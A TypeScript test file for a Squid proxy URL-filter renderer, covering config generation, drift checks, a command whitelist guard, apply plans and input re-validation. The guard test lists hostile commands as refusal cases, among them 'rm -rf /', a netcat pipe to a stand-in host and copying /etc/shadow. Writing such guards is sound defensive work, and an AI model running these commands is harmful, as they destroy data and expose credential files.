const policy = (over: Partial<UfPolicyInput> = {}): UfPolicyInput => ({
  id: 1,
  name: "corp-web",
  defaultAction: "block",
  safeSearchEnforce: false,
  fileTypesBlocked: [],
  httpsInspection: false,
  transparentProxy: false,
  enabled: true,
  ...over,
});

const rule = (over: Partial<UfCustomListInput> = {}): UfCustomListInput => ({
  policyId: 1,
  listType: "block",
  matchType: "domain",
  value: "blockme.example",
  ...over,
});

const input = (over: Partial<UfRenderInput> = {}): UfRenderInput => ({
  policies: [policy()],
  categoryRules: [],
  customLists: [],
  ...over,
});

// ── helpers ────────────────────────────────────────────────────────────────

describe("custom-list value mapping", () => {
  it("maps domain → .value (covers subdomains), wildcard *.base → .base, url → null", () => {
    expect(customListToDstdomain("domain", "shop.example")).toBe(".shop.example");
    expect(customListToDstdomain("wildcard", "*.cdn.example")).toBe(".cdn.example");
    expect(customListToDstdomain("url", "https://x.example/a")).toBeNull();
  });
  it("escapes regex metacharacters and anchors url entries at the scheme", () => {
    expect(escapeRegex("a.b?c[d](e)*f\\g")).toBe("a\\.b\\?c\\[d\\]\\(e\\)\\*f\\\\g");
    expect(customListToUrlRegex("https://example.com/path?x=1")).toBe("^https://example\\.com/path\\?x=1");
  });
  it("builds one sorted urlpath_regex alternation from file types", () => {
    expect(fileTypesRegex(["exe", "bat", "exe", "SCR"])).toBe("\\.(bat|exe|scr)$");
    expect(fileTypesRegex([])).toBeNull();
    expect(fileTypesRegex(["TOOLONGEXT9999"])).toBeNull();
  });
  it("derives squid-safe acl names", () => {
    expect(aclName("allow", 12, "dom")).toBe("utm_allow_12_dom");
    expect(aclName("block", 3, "url")).toBe("utm_block_3_url");
  });
});

// ── renderer ───────────────────────────────────────────────────────────────

describe("renderSquidConf — full-file management (include-after-deny-all fix)", () => {
  const stock = renderSquidConf(input());

  it("is byte-stable and hash-stable", () => {
    const again = renderSquidConf(input());
    expect(again.conf).toBe(stock.conf);
    expect(again.confHash).toBe(stock.confHash);
    expect(again.confHash).toHaveLength(16);
    expect(sha256_16(stock.conf)).toBe(stock.confHash);
  });

  it("keeps essential stock settings, stock ACLs and port hygiene", () => {
    for (const line of [
      "http_port 3128",
      "access_log daemon:/var/log/squid/access.log squid",
      "coredump_dir /var/spool/squid",
      "acl localnet src 10.0.0.0/8",
      "acl localnet src 172.16.0.0/12",
      "acl localnet src 192.168.0.0/16",
      "acl localnet src fc00::/7",
      "acl localnet src fe80::/10",
      "acl SSL_ports port 443",
      "acl Safe_ports port 1025-65535 # unregistered ports",
      "acl CONNECT method CONNECT",
      "http_access deny !Safe_ports",
      "http_access deny CONNECT !SSL_ports",
    ]) {
      expect(stock.conf).toContain(line);
    }
    expect(stock.conf).not.toMatch(/^cache_dir\s/m); // pure ACL proxy — no cache
  });

  it("ends with http_access deny all BEFORE the conf.d include (LAST)", () => {
    const denyAll = stock.conf.lastIndexOf("http_access deny all");
    const include = stock.conf.lastIndexOf("include /etc/squid/conf.d/*.conf");
    expect(denyAll).toBeGreaterThan(0);
    expect(include).toBeGreaterThan(denyAll);
    expect(stock.conf.trimEnd().endsWith("include /etc/squid/conf.d/*.conf")).toBe(true);
    expect(stock.conf.startsWith("# Generated by Cryptsk Console — do not edit")).toBe(true);
  });

  it("renders ALWAYS_BLOCKED (malware, phishing) denies FIRST after port hygiene", () => {
    const lines = stock.conf.split("\n");
    const firstAllowIdx = lines.findIndex((l) => l.startsWith("http_access allow utm_allow_1_dom"));
    const hygieneIdx = lines.findIndex((l) => l.startsWith("http_access deny CONNECT !SSL_ports"));
    const malwareIdx = lines.findIndex((l) => l.startsWith("http_access deny utm_cat_malware"));
    const phishingIdx = lines.findIndex((l) => l.startsWith("http_access deny utm_cat_phishing"));
    expect(hygieneIdx).toBeGreaterThan(-1);
    expect(malwareIdx).toBeGreaterThan(hygieneIdx);
    expect(phishingIdx).toBeGreaterThan(malwareIdx);
    // custom allow (when present) comes AFTER the always-blocked denies
    if (firstAllowIdx > -1) {
      expect(firstAllowIdx).toBeGreaterThan(phishingIdx);
    }
    expect(lines[malwareIdx - 1]).toContain("acl utm_cat_malware dstdomain .malware-cdn.xyz .trojan-distro.example");
  });

  it("maps custom lists: inline dstdomain for domain/wildcard, url_regex for urls", () => {
    const r = renderSquidConf(
      input({
        customLists: [
          rule({ value: "blocked.example" }),
          rule({ matchType: "wildcard", value: "*.cdn.example", listType: "block" }),
          rule({ matchType: "url", value: "https://evil.example/payload", listType: "block" }),
          rule({ listType: "allow", value: "ok.example" }),
        ],
      }),
    );
    expect(r.conf).toContain("acl utm_allow_1_dom dstdomain .ok.example");
    expect(r.conf).toContain("# reason: custom_allow");
    expect(r.conf).toContain("http_access allow utm_allow_1_dom");
    expect(r.conf).toContain("acl utm_block_1_dom dstdomain .blocked.example .cdn.example");
    expect(r.conf).toContain("acl utm_block_1_url url_regex -i ^https://evil\\.example/payload");
    expect(r.conf).toContain("# reason: custom_block");
    // custom allow outranks custom block + category denies (first-match-wins)
    const lines = r.conf.split("\n");
    expect(lines.findIndex((l) => l.startsWith("http_access allow utm_allow_1_dom"))).toBeLessThan(
      lines.findIndex((l) => l.startsWith("http_access deny utm_block_1_dom")),
    );
    expect(r.managedCounts.allow).toBe(1);
    expect(r.managedCounts.block).toBe(3);
  });

  it("orders category rules allow → block → warn(deny) and warns about warn-as-deny", () => {
    const r = renderSquidConf(
      input({
        categoryRules: [
          { policyId: 1, category: "gambling", action: "allow", listSource: "aggregated", enabled: true },
          { policyId: 1, category: "adult", action: "block", listSource: "aggregated", enabled: true },
          { policyId: 1, category: "streaming", action: "warn", listSource: "aggregated", enabled: true },
        ],
      }),
    );
    const lines = r.conf.split("\n");
    const allow = lines.findIndex((l) => l.startsWith("http_access allow utm_cat_gambling"));
    const block = lines.findIndex((l) => l.startsWith("http_access deny utm_cat_adult"));
    const warn = lines.findIndex((l) => l.startsWith("http_access deny utm_cat_streaming"));
    expect(allow).toBeLessThan(block);
    expect(block).toBeLessThan(warn);
    expect(r.conf).toContain("warn rendered as deny (squid ACLs have no log-only warn action");
    // category ACLs use the catalog sample domains (sorted, leading dot)
    expect(r.conf).toContain("acl utm_cat_gambling dstdomain .bet-casino.io .gamble-site.net");
    // aggregated feed honesty
    expect(r.warnings.some((w) => w.includes("aggregated feed") && w.includes("not installed"))).toBe(true);
    // implicit deny-all still last
    expect(r.conf).toContain("http_access deny all");
  });

  it("renders file-type blocking as http_reply_access denies", () => {
    const r = renderSquidConf(input({ policies: [policy({ fileTypesBlocked: ["exe", "bat"] })] }));
    expect(r.conf).toContain("acl utm_files_1 urlpath_regex -i \\.(bat|exe)$");
    expect(r.conf).toContain("# reason: file_type");
    expect(r.conf).toContain("http_reply_access deny utm_files_1");
    expect(r.managedCounts.fileTypes).toBe(1);
  });

  it("adds default-allow (localhost + localnet) only for defaultAction=allow policies", () => {
    const denyAll = renderSquidConf(input({ policies: [policy({ defaultAction: "block" })] }));
    expect(denyAll.conf).not.toContain("http_access allow localnet");

    const allowDefault = renderSquidConf(input({ policies: [policy({ defaultAction: "allow" })] }));
    const lines = allowDefault.conf.split("\n");
    const allowLan = lines.findIndex((l) => l.startsWith("http_access allow localnet"));
    const deny = lines.findIndex((l) => l.startsWith("http_access deny all"));
    expect(allowLan).toBeGreaterThan(-1);
    expect(allowLan).toBeLessThan(deny);
    expect(lines[allowLan - 2]).toContain("reason: default"); // comment precedes the localhost/localnet pair
  });

  it("renders the safesearch rewriter + utm_search acl when enforced, warns about HTTPS", () => {
    const r = renderSquidConf(input({ policies: [policy({ safeSearchEnforce: true })] }));
    expect(r.safesearchScript).toContain("#!/bin/sh");
    expect(r.safesearchScript).toContain(SAFESSEARCH_SCRIPT);
    expect(r.safesearchScript).toContain("safe=active");
    expect(r.conf).toContain(`url_rewrite_program ${SAFESSEARCH_SCRIPT}`);
    expect(r.conf).toContain("url_rewrite_children 5");
    expect(r.conf).toContain("acl utm_search dstdomain .google.com .bing.com .duckduckgo.com .search.brave.com .yahoo.com");
    expect(r.conf).toContain("url_rewrite_access allow utm_search");
    expect(r.warnings.some((w) => w.includes("HTTPS requires ssl-bump"))).toBe(true);
    // rendered as a second managed FILE (chmod 0755), not inline shell
    expect(r.conf).not.toContain("safe=active");
  });

  it("renders disabled policies as comments only and skips their rules", () => {
    const r = renderSquidConf(
      input({
        policies: [policy({ enabled: false })],
        customLists: [rule()],
        categoryRules: [{ policyId: 1, category: "adult", action: "block", listSource: "aggregated", enabled: true }],
      }),
    );
    expect(r.conf).toContain("# policy 1: corp-web — DISABLED in console, not rendered");
    expect(r.conf).not.toContain("acl utm_block_1_dom");
    expect(r.conf).not.toContain("utm_cat_adult");
    expect(r.policyHashes[1]).toBeUndefined(); // disabled → no rendered section
  });

  it("warns on httpsInspection and transparentProxy honestly (no ssl-bump / intercept emitted)", () => {
    const r = renderSquidConf(
      input({ policies: [policy({ httpsInspection: true, transparentProxy: true })] }),
    );
    expect(r.warnings.some((w) => w.includes("ssl-bump requires the ssl-crtd build"))).toBe(true);
    expect(r.warnings.some((w) => w.includes("nft TPROXY redirect"))).toBe(true);
    expect(r.conf).not.toContain("ssl_bump");
    expect(r.conf).not.toContain("http_port 3128 intercept");
    expect(r.conf).toContain("http_port 3128");
  });

  it("warns when a custom list exceeds the inline cap but still inlines", () => {
    const lists = Array.from({ length: INLINE_ACL_CAP + 1 }, (_, i) => rule({ value: `d${String(i).padStart(3, "0")}.example` }));
    const r = renderSquidConf(input({ customLists: lists }));
    expect(r.warnings.some((w) => w.includes(`${INLINE_ACL_CAP + 1} entries`))).toBe(true);
    expect(r.conf).toContain(".d000.example");
  });

  it("annotates rule groups with the testUrl reason oracle", () => {
    expect(stock.conf).toContain("reason: category/ALWAYS_BLOCKED");
    expect(stock.conf).toContain("reason: default");
    const withLists = renderSquidConf(input({ customLists: [rule(), rule({ listType: "allow", value: "ok.example" })] }));
    expect(withLists.conf).toContain("reason: custom_allow");
    expect(withLists.conf).toContain("reason: custom_block");
  });
});

// ── drift ──────────────────────────────────────────────────────────────────

describe("computeSquidDrift", () => {
  const rendered = renderSquidConf(input());

  it("in-sync only flips on file hash + unit state (port is informational)", () => {
    const ok = computeSquidDrift(
      { available: true, managedFilePresent: true, liveHash: rendered.confHash, running: true, port3128Bound: false },
      rendered.confHash,
    );
    expect(ok.inSync).toBe(true);
    expect(ok.driftReasons.some((r) => r.includes("port 3128"))).toBe(true);
  });

  it("flags missing file, hash mismatch and dead unit", () => {
    const missing = computeSquidDrift(
      { available: true, managedFilePresent: false, liveHash: null, running: false, port3128Bound: false },
      rendered.confHash,
    );
    expect(missing.inSync).toBe(false);
    expect(missing.driftReasons).toContain("managed squid.conf not deployed — apply to OS");

    const drifted = computeSquidDrift(
      { available: true, managedFilePresent: true, liveHash: "deadbeefdeadbeef", running: false, port3128Bound: false },
      rendered.confHash,
    );
    expect(drifted.inSync).toBe(false);
    expect(drifted.driftReasons.some((r) => r.includes("deadbeefdeadbeef"))).toBe(true);
    expect(drifted.driftReasons.some((r) => r.includes("not active"))).toBe(true);
  });

  it("reports unsupported when squid is absent", () => {
    const d = computeSquidDrift(
      { available: false, managedFilePresent: false, liveHash: null, running: false, port3128Bound: false },
      rendered.confHash,
    );
    expect(d.inSync).toBe(false);
    expect(d.driftReasons[0]).toContain("squid binary not available");
  });
});

// ── whitelist guard ────────────────────────────────────────────────────────

describe("squidStepGuarded", () => {
  it("allows the exact squid lifecycle verbs only", () => {
    expect(squidStepGuarded(`squid -k parse -f ${UF_STAGE_FILE}`)).toBe(true);
    expect(squidStepGuarded(`squid -k parse -f ${SQUID_CONF}`)).toBe(true);
    expect(squidStepGuarded("squid -k reconfigure")).toBe(true);
    expect(squidStepGuarded(`install -m 0644 ${UF_STAGE_FILE} ${SQUID_CONF}`)).toBe(true);
    expect(squidStepGuarded("install -m 0755 /var/lib/console/url-filter/stage-safesearch-rewrite.sh /var/lib/console/url-filter/safesearch-rewrite.sh")).toBe(true);
    expect(squidStepGuarded("cp /etc/squid/squid.conf /var/lib/console/url-filter/backup-t/squid.conf")).toBe(true);
    expect(squidStepGuarded("systemctl restart squid")).toBe(true);
    expect(squidStepGuarded("systemctl is-active squid")).toBe(true);
    expect(squidStepGuarded("ss -ltn '( sport = :3128 )'")).toBe(true);
    expect(squidStepGuarded("rm -f /var/lib/console/url-filter/stage-squid.conf")).toBe(true);
  });
  it("refuses anything else (including chained commands)", () => {
    for (const evil of [
      "",
      "rm -rf /",
      "reboot",
      `squid -k parse -f ${UF_STAGE_FILE}; rm -rf /`,
      "systemctl restart squid && shutdown",
      "ss -ltn | nc evil 4444",
      "install -m 0644 /etc/passwd /etc/squid/squid.conf",
      "cp /etc/shadow /var/lib/console/url-filter/x",
      "squid -k shutdown",
    ]) {
      expect(squidStepGuarded(evil)).toBe(false);
    }
  });
});

// ── apply plan ─────────────────────────────────────────────────────────────

describe("buildSquidApplyPlan", () => {
  const facts = { available: true, managedFilePresent: true, liveHash: "aaa", running: true, port3128Bound: true };
  const plan = buildSquidApplyPlan(input(), facts, { mode: "exec", ts: "2026-01-02T03-04-05-000Z" });

  it("orders: backup → stage-validate → install → reload → verify → cleanup", () => {
    const kinds = plan.steps.map((s) => s.kind);
    expect(kinds[0]).toBe("backup");
    expect(kinds[1]).toBe("validate");
    expect(kinds).toContain("install");
    expect(kinds).toContain("reload");
    expect(kinds[kinds.length - 1]).toBe("cleanup");
    // validate the STAGE, never the live conf, before installing
    const validateIdx = kinds.indexOf("validate");
    const installIdx = kinds.indexOf("install");
    expect(validateIdx).toBeLessThan(installIdx);
    expect(plan.steps[validateIdx].cmd).toBe(`squid -k parse -f ${UF_STAGE_FILE}`);
    expect(plan.steps[installIdx].cmd).toBe(`install -m 0644 ${UF_STAGE_FILE} ${SQUID_CONF}`);
    // running unit → graceful reconfigure, not restart
    expect(plan.steps.find((s) => s.kind === "reload")?.cmd).toBe("squid -k reconfigure");
    // verify = is-active + live parse + port probe
    expect(plan.steps.filter((s) => s.kind === "verify").map((s) => s.cmd)).toEqual([
      "systemctl is-active squid",
      `squid -k parse -f ${SQUID_CONF}`,
      "ss -ltn '( sport = :3128 )'",
    ]);
    // backup lands in the console-owned state dir
    expect(plan.steps[0].cmd).toBe(`cp /etc/squid/squid.conf /var/lib/console/url-filter/backup-2026-01-02T03-04-05-000Z/squid.conf`);
    expect(plan.guarded).toBe(true);
    expect(plan.refused).toBeNull();
  });

  it("restarts (not reconfigures) when squid was down and stages the rewriter", () => {
    const down = buildSquidApplyPlan(
      input({ policies: [policy({ safeSearchEnforce: true })] }),
      { ...facts, running: false },
      { mode: "exec", ts: "t" },
    );
    expect(down.steps.find((s) => s.kind === "reload")?.cmd).toBe("systemctl restart squid");
    expect(down.files.some((f) => f.path.endsWith("stage-safesearch-rewrite.sh") && f.mode === 0o755)).toBe(true);
    expect(down.wasRunning).toBe(false);
  });

  it("carries rollback steps (restore → revalidate → restart) and skipped disabled policies", () => {
    const p = buildSquidApplyPlan(
      input({ policies: [policy({ enabled: false }), policy({ id: 2, name: "guest" })] }),
      facts,
      { mode: "plan", ts: "t" },
    );
    expect(p.rollbackSteps.map((s) => s.kind)).toEqual(["restore", "validate", "reload"]);
    expect(p.rollbackSteps[1].cmd).toBe(`squid -k parse -f ${SQUID_CONF}`);
    expect(p.skipped.some((s) => s.name.includes("corp-web"))).toBe(true);
    expect(p.mode).toBe("plan");
    expect(p.confText).toContain("# Generated by Cryptsk Console — do not edit");
  });
});

// ── renderer re-validation refusal (hardSslRefusal pattern) ───────────────

describe("hardUfRefusal — custom-list values re-validated before interpolation", () => {
  const facts = { available: true, managedFilePresent: false, liveHash: null, running: false, port3128Bound: false };

  it("passes a legitimate custom list", () => {
    expect(hardUfRefusal(input({ customLists: [rule()] }))).toBeNull();
    expect(hardUfRefusal(input({ customLists: [rule({ matchType: "wildcard", value: "*.cdn.example" }), rule({ matchType: "url", value: "https://x.example/a?b=1" })] }))).toBeNull();
  });

  it("refuses a value that no longer matches its matchType grammar (validator bypass / legacy row)", () => {
    const bad = hardUfRefusal(input({ customLists: [rule({ value: "not-a-domain" })] }));
    expect(bad).toContain("refused");
    expect(bad).toContain("no longer matches the domain grammar");
    const plan = buildSquidApplyPlan(input({ customLists: [rule({ value: "not-a-valid-." })] }), facts, { mode: "plan", ts: "t" });
    expect(plan.refused).toContain("refused");
  });

  it("refuses shell/squid-token-breaking characters outright (whitespace splits ACL tokens)", () => {
    expect(hardUfRefusal(input({ customLists: [rule({ value: "a b c" })] }))).toContain("cannot carry safely");
    expect(hardUfRefusal(input({ customLists: [rule({ matchType: "url", value: "https://x.example/a;id" })] }))).toContain("cannot carry safely");
  });
});

